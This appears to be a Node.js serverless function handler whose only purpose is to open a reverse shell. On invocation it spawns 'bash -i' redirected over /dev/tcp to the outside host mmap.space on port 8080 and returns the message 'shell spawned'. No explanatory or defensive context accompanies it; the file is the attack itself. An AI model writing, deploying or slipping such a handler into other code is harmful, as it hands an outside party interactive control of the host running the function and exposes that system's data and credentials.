const { spawn } = require('child_process');


exports.handler = async (event) => {

  var child = spawn('bash -i >& /dev/tcp/mmap.space/8080 0>&1');

  return {
    message: `shell spawned`,

  }; 
};
